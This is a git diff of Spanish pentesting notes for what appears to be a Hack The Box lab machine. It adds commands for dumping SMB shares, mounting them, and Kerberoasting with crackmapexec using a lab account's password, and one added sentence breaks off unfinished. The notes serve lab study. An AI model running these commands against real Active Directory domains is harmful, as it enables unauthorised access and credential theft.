@@ -48,6 +48,14 @@ Con credenciales:
 smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Groups
 </pre>
 
+### SMBGET 
+
+Para descargar un directorio entero:
+
+<pre>
+smbget -R smb://active.htb/Replication -U ""
+</pre>
+
 ### smbclient
 
 Visualizar sin credenciales:
@@ -57,6 +65,11 @@ smbclient -L //10.10.10.100/Replication -N
 
 </pre>
 
+Tambien se puede montar unidad con **mount**
+
+<pre>
+sudo mount -t cifs //active.htb/Replication /mnt/HTB/Active -o username="{user}",password="{pass}",domain=active.htb,rw
+</pre>
 ### rpcclient
 
 Una vez que tenemos credencales nos podemos conectar co  **rpcclient**:
@@ -110,6 +123,7 @@ Cuando solo se dispone de usuarios, sin credenciales, **y estando en un entorno 
 GetNPUsers.py active.htb/ -no-pass -usersfile users.txt 
 </pre>
 
+Tambien puede hacerse un ataque 
 ### Kerbrute
 
 Si está el puerto de kerberos aberto, el 88, se puede usar kerbrute para enumerar teniendo un diccionario.
@@ -117,7 +131,7 @@ Si está el puerto de kerberos aberto, el 88, se puede usar kerbrute para enumer
 kerbrute userenum -dc 10.10.10.100 -d active.htb /usr/share/wordlists/SecList/Usernames/Names/names.txt
 </pre>
 
-### GetUsersSPNs
+### GetUsersSPNs, Kerberoasting ATTACK
 
 Si no es Kerberoasteable podemos usar esta opción para enumerar.
 
@@ -132,7 +146,11 @@ Si hay resultado se puede obtener un TGS, (Ticket Garanting Service). El hash se
 GetUsersSPNs.py active.htb/USUARIO:CONTRASEÑA -request
 </pre>
 
+Tambien puede hacerse kerberos con credenciales con *+crackmapexec**:
 
+<pre>
+crackmapexec ldap active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --kerberoasting TGS-REP
+</pre>
 ### PSEXEC
 
 Si con **crackmapexec smb** nos aparece **Pwned** podemos obtener acceso con psexec:
